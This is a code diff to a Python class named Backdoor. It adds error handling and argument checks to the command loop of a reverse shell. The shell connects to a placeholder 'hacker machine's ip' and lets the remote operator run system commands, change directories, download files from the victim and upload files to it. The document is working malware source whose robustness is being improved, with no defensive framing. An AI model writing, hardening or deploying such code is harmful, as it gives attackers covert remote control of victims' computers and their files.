@@ -77,23 +77,40 @@ class Backdoor:
 
     def run(self):
         while True:
-            command = self.reliable_receive()
+            # Guard against receive errors or lost connection
             try:
-                if command[0] == "exit":
+                command = self.reliable_receive()
+                if command is None:
+                    print("[!] Connection lost")
+                    break
+            except Exception as e:
+                print(f"[!] Error receiving command: {e}")
+                break
+
+            # Validate and dispatch command
+            try:
+                if not command or len(command) < 1:
+                    command_result = "[!] Invalid command received\n".encode()
+                elif command[0] == "exit":
                     self.connection.close()
                     exit()
                 elif command[0] == "cd" and len(command) > 1:
-                    command_result = self.change_working_directory(command[1]) 
-                elif command[0] == "download":
-                    command_result = self.read_file(command[1])  
-                elif command[0] == "upload":
-                    command_result = self.write_file(command[1], command[2])         
+                    command_result = self.change_working_directory(command[1])
+                elif command[0] == "download" and len(command) > 1:
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload" and len(command) > 2:
+                    command_result = self.write_file(command[1], command[2])
                 else:
                     command_result = self.execute_system_command(command)
             except Exception as e:
-                command_result = f"[!] Error: {str(e)}\n".encode()        
-            self.reliable_send(command_result)    
+                command_result = f"[!] Error: {str(e)}\n".encode()
 
+            # Guard against send failures
+            try:
+                self.reliable_send(command_result)
+            except Exception as e:
+                print(f"[!] Error sending result: {e}")
+                break
 
 
 my_backdoor = Backdoor("Enter hacker machine's ip here", "Enter port number here as integer")
